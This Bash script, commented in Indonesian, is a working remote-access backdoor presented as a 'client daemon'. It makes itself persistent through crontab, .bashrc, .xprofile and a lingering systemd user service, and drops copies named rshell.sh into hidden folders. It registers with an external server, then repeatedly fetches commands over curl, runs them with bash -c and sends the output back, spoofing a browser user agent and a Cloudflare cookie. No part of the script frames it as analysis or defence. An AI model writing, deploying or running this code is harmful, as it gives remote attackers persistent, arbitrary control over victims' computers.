#!/usr/bin/env bash

INSTALL_LOG="$HOME/.client_daemon_installed"
SCRIPT_PATH="$(realpath "$0")"
SCRIPT_NAME="$(basename "$SCRIPT_PATH")"
LOG_FILE="$HOME/client_daemon.log"

TARGET_FOLDERS=(
    "$HOME/.config/system"
    "$HOME/.system"
    "$HOME/.user"
    "$HOME/.local/system"
    "$HOME/.cache/system"
    "$HOME/.shared/system"
)

SERVICE_CONTENT="[Unit]
Description=Client Daemon Service
After=network.target

[Service]
ExecStart=/usr/bin/bash $SCRIPT_PATH
Restart=always
RestartSec=10
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=default.target"

if [[ "$0" != "nohup" && -z "$NOHUP_RUNNING" ]]; then
    echo "[INFO] Menjalankan script menggunakan nohup..."
    export NOHUP_RUNNING=1
    nohup bash "$SCRIPT_PATH" > "$LOG_FILE" 2>&1 &
    exit 0
fi

deploy_script_to_folders() {
    for folder in "${TARGET_FOLDERS[@]}"; do
        echo "[INFO] Menyebarkan rshell.sh ke $folder..."
        mkdir -p "$folder"
        cp "$SCRIPT_PATH" "$folder/rshell.sh"
        echo "[INFO] File rshell.sh berhasil disalin ke $folder"
        (
            sleep 5
            echo "[INFO] Menghapus rshell.sh dari $folder setelah 5 detik..."
            rm -rf "$folder/rshell.sh"
        ) &
    done
}

add_to_crontab() {
    echo "[INFO] Menambahkan script ke crontab..."
    (crontab -l 2>/dev/null; echo "@reboot nohup bash $SCRIPT_PATH > $LOG_FILE 2>&1 &") | sort -u | crontab -
}

add_to_bashrc() {
    if ! grep -Fxq "nohup bash $SCRIPT_PATH > $LOG_FILE 2>&1 &" "$HOME/.bashrc"; then
        echo "[INFO] Menambahkan script ke .bashrc..."
        echo "nohup bash $SCRIPT_PATH > $LOG_FILE 2>&1 &" >> "$HOME/.bashrc"
    fi
}

add_to_xprofile() {
    if ! grep -Fxq "nohup bash $SCRIPT_PATH > $LOG_FILE 2>&1 &" "$HOME/.xprofile"; then
        echo "[INFO] Menambahkan script ke .xprofile..."
        echo "nohup bash $SCRIPT_PATH > $LOG_FILE 2>&1 &" >> "$HOME/.xprofile"
    fi
}

deploy_service_to_folders() {
    for folder in "${TARGET_FOLDERS[@]}"; do
        echo "[INFO] Menyebarkan service file ke $folder..."
        mkdir -p "$folder"
        echo "$SERVICE_CONTENT" > "$folder/client_daemon.service"
        echo "[INFO] Service file berhasil disalin ke $folder"
    done
}

create_systemd_service() {
    SYSTEMD_USER_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SYSTEMD_USER_DIR"
    SERVICE_FILE="$SYSTEMD_USER_DIR/client_daemon.service"

    if [[ ! -f "$SERVICE_FILE" ]]; then
        echo "[INFO] Membuat systemd service untuk script..."
        echo "$SERVICE_CONTENT" > "$SERVICE_FILE"

        systemctl --user daemon-reload
        systemctl --user enable client_daemon.service
        systemctl --user start client_daemon.service
        echo "[INFO] Systemd service berhasil dibuat dan dijalankan."
    fi
    loginctl enable-linger $(whoami)
}

if [[ ! -f "$INSTALL_LOG" ]]; then
    echo "[INFO] Menginstal client daemon secara permanen..."
    deploy_script_to_folders
    deploy_service_to_folders
    add_to_crontab
    add_to_bashrc
    add_to_xprofile
    create_systemd_service

    echo "$(date): Script berhasil diinstal" > "$INSTALL_LOG"
    echo "[INFO] Script berhasil diinstal dan berjalan di latar belakang."
fi

echo "[INFO] Script sudah diinstal, memulai proses utama..."
CLIENT_ID=$(cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 12)
SECRET=$(openssl rand -hex 8)

SERVER="https://saskra.com/sh3lL1"
echo "[INFO] Mendaftarkan client ke server dengan SECRET=$SECRET dan CLIENT_ID=$CLIENT_ID..."
curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"secret\":\"$SECRET\", \"client_id\":\"$CLIENT_ID\"}" \
    "$SERVER/register_client.php"

while true; do
    cmd=$(curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Cookie: cf_clearance=<cookie_value>" \
        -X POST -d "token=$SECRET" "$SERVER/get_command_and_post_result.php")

    if [[ "$cmd" == "NO_COMMAND" || -z "$cmd" ]]; then
        sleep 10
        continue
    fi

    echo "[INFO] Menjalankan perintah: $cmd"
    result=$(bash -c "$cmd" 2>&1)

    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Cookie: cf_clearance=<cookie_value>" \
        -X POST -d "token=$SECRET" --data-urlencode "result=$result" \
        "$SERVER/get_command_and_post_result.php" >/dev/null
    sleep 10
done
